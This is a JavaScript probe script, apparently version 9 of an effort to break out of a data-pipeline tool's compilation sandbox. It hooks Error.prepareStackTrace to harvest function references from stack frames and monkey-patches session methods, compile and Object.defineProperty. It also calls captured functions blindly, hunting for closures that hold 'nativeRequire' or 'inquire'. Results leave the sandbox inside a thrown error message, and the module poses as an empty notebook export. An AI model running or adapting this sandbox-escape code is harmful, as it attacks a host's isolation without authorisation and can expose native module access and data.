// v9 — Error.prepareStackTrace hook globally to capture function refs from bundle stack frames
// CallSite.getFunction() returns the function reference. If any function on the stack has
// closure access to nativeRequire/inquire, we can hijack/extract.

var out = {};
function safe(k, fn) {
  try { var v = fn(); out[k] = (typeof v === 'string' ? v : JSON.stringify(v)).substring(0, 3000); }
  catch(e) { out[k] = 'ERR:' + (e.message || String(e)).substring(0, 400); }
}

// ============ TIER A: Install global prepareStackTrace hook ============
globalThis.__capturedFrames = [];
globalThis.__capturedFunctions = {};
globalThis.__seenSources = {};

var ORIG_PREP = Error.prepareStackTrace;
Error.stackTraceLimit = 100;

function captureFrames(err, callSites) {
  try {
    for (var i = 0; i < callSites.length; i++) {
      var cs = callSites[i];
      try {
        var fn = cs.getFunction && cs.getFunction();
        var fnName = cs.getFunctionName && cs.getFunctionName();
        var fileName = cs.getFileName && cs.getFileName();
        var typeName = cs.getTypeName && cs.getTypeName();
        var methodName = cs.getMethodName && cs.getMethodName();

        if (fn && typeof fn === 'function') {
          var src = String(fn).substring(0, 500);
          var key = (fileName || 'unknown') + ':' + (fnName || methodName || 'anon') + ':' + src.length;
          if (!globalThis.__capturedFunctions[key]) {
            globalThis.__capturedFunctions[key] = {
              fn_ref: fn,
              src: src,
              fileName: fileName,
              fnName: fnName,
              typeName: typeName,
              methodName: methodName,
              this_keys: cs.getThis && cs.getThis() ? Object.keys(cs.getThis()).slice(0,15).join(',') : null
            };
          }
        }
      } catch(e) {}
    }
  } catch(e) {}
  return ''; // return empty string for .stack
}

Error.prepareStackTrace = captureFrames;

// ============ TIER B: Force errors to fire prepareStackTrace ============
safe('B1_throw_and_capture', function() {
  try { throw new Error('probe1'); } catch(e) { e.stack; }
  return 'errs forced, captured=' + Object.keys(globalThis.__capturedFunctions).length;
});

// Hook session methods that internally throw / capture stack (getCallerFile)
safe('B2_trigger_getCallerFile_via_publish', function() {
  // publish() internally calls g.getCallerFile which captures stack
  // Our prepareStackTrace IS NOT used inside getCallerFile (it saves+restores)
  // BUT other functions in the call chain might fire stack reads
  var p = publish('stack_capture_test', { type: 'view' });
  return 'published, captured=' + Object.keys(globalThis.__capturedFunctions).length;
});

// Try forcing many error sites
safe('B3_force_errors_in_compile_paths', function() {
  // session.compileError records errors with stack
  try { global._DF_SESSION.compileError(new Error('forced_err'), 'definitions/x.sqlx'); } catch(e) {}
  // session.resolve to non-existent
  try { global._DF_SESSION.resolve({name: 'nonexistent', schema: 'x'}); } catch(e) {}
  // session.alterActionName?
  return 'errors forced, captured=' + Object.keys(globalThis.__capturedFunctions).length;
});

// ============ TIER C: Inspect captured frames ============
safe('C1_captured_frame_count', function() {
  return 'total=' + Object.keys(globalThis.__capturedFunctions).length;
});

safe('C2_captured_frame_summary', function() {
  var keys = Object.keys(globalThis.__capturedFunctions);
  var summary = [];
  for (var k of keys.slice(0, 40)) {
    var f = globalThis.__capturedFunctions[k];
    summary.push({
      file: f.fileName,
      name: f.fnName || f.methodName,
      type: f.typeName,
      src_preview: f.src.substring(0, 200)
    });
  }
  return JSON.stringify(summary);
});

// ============ TIER D: Search captured for inquire-related ============
safe('D1_search_inquire_in_captures', function() {
  var results = [];
  for (var k of Object.keys(globalThis.__capturedFunctions)) {
    var f = globalThis.__capturedFunctions[k];
    if (f.src.indexOf('inquire') >= 0 ||
        f.src.indexOf('nativeRequire') >= 0 ||
        f.src.indexOf('eval(') >= 0 ||
        f.src.indexOf('process') >= 0) {
      results.push({key: k, file: f.fileName, name: f.fnName, src: f.src.substring(0, 400)});
    }
  }
  return JSON.stringify(results);
});

// ============ TIER E: try calling captured functions to see what they return ============
// Some captured functions might internally use closure-bound modules
safe('E1_try_call_captured', function() {
  var results = [];
  var keys = Object.keys(globalThis.__capturedFunctions).slice(0, 15);
  for (var k of keys) {
    var f = globalThis.__capturedFunctions[k];
    if (!f.fn_ref) continue;
    try {
      // Try calling with no args
      var r = f.fn_ref.call(globalThis);
      results.push({k, called_noargs: typeof r + ':' + String(r).substring(0,80)});
    } catch(e) {
      results.push({k, err: e.message.substring(0,100)});
    }
  }
  return JSON.stringify(results);
});

// ============ TIER F: Hijack a frame's THIS to control what it does ============
// If a frame's `this` is the session, and we hook session.X to capture more frames
safe('F1_hook_all_session_methods', function() {
  var s = global._DF_SESSION;
  var protoT = Object.getPrototypeOf(s);
  var methods = Object.getOwnPropertyNames(protoT);
  globalThis.__sessionCalls = [];
  for (var m of methods) {
    if (m === 'constructor') continue;
    var orig = protoT[m];
    if (typeof orig !== 'function') continue;
    try {
      (function(name, fn) {
        protoT[name] = function() {
          try {
            globalThis.__sessionCalls.push({name: name, args_types: Array.from(arguments).map(a => typeof a).join(',')});
          } catch(e) {}
          // Capture current stack at call time
          try { (new Error('hook_' + name)).stack; } catch(e) {}
          return fn.apply(this, arguments);
        };
      })(m, orig);
    } catch(e) {}
  }
  return 'hooked ' + methods.length + ' methods';
});

// ============ TIER G: Crucial — modify compile to FORCE a thrown error from inside ============
// inside session.compile, a thrown error from any sub-function calls prepareStackTrace
safe('G1_modify_compile_force_inner_error', function() {
  var s = global._DF_SESSION;
  var origCompile = s.compile;
  s.compile = function() {
    // Hook session.compileGraphChunk to throw before completion
    var origCGC = s.compileGraphChunk;
    s.compileGraphChunk = function(items) {
      // Each item.compile() — wrap that
      for (var item of items) {
        if (item.compile) {
          var origItemCompile = item.compile.bind(item);
          item.compile = function() {
            try { return origItemCompile.apply(this, arguments); }
            catch(e) {
              // Read e.stack to fire our prepareStackTrace
              e.stack;
              throw e;
            }
          };
        }
      }
      return origCGC.call(this, items);
    };
    return origCompile.apply(this, arguments);
  };
  return 'compile wrapped';
});

// ============ TIER H: Try a DIFFERENT primitive — wrap proto setter ============
// If we replace Object.defineProperty or Object.prototype, sub-modules may use them
safe('H1_define_property_hook', function() {
  var orig = Object.defineProperty;
  globalThis.__defineCalls = [];
  Object.defineProperty = function(target, prop, descriptor) {
    try {
      if (descriptor && typeof descriptor.value === 'function') {
        globalThis.__defineCalls.push({
          prop: String(prop),
          val_src: String(descriptor.value).substring(0,200),
          target_ctor: target && target.constructor && target.constructor.name
        });
      }
    } catch(e) {}
    return orig.apply(this, arguments);
  };
  return 'hooked Object.defineProperty';
});

// ============ TIER I: Force compile NOW with everything hooked ============
safe('I1_force_compile_again', function() {
  try {
    global._DF_SESSION.compile();
    return 'compiled. captured_fns=' + Object.keys(globalThis.__capturedFunctions).length +
           ' session_calls=' + (globalThis.__sessionCalls ? globalThis.__sessionCalls.length : 0) +
           ' define_calls=' + (globalThis.__defineCalls ? globalThis.__defineCalls.length : 0);
  } catch(e) { return 'err:' + e.message; }
});

safe('I2_final_summary', function() {
  return {
    captured_fn_count: Object.keys(globalThis.__capturedFunctions).length,
    captured_fn_keys_sample: Object.keys(globalThis.__capturedFunctions).slice(0,10),
    session_call_count: globalThis.__sessionCalls ? globalThis.__sessionCalls.length : 0,
    session_call_sample: globalThis.__sessionCalls ? globalThis.__sessionCalls.slice(0,10) : null,
    define_call_count: globalThis.__defineCalls ? globalThis.__defineCalls.length : 0,
  };
});

// Restore prepareStackTrace before exit so other things don't break
Error.prepareStackTrace = ORIG_PREP;

module.exports.asJson = { cells: [], metadata: {}, nbformat: 4, nbformat_minor: 5 };
throw new Error('PROBE_v9:' + JSON.stringify(out));
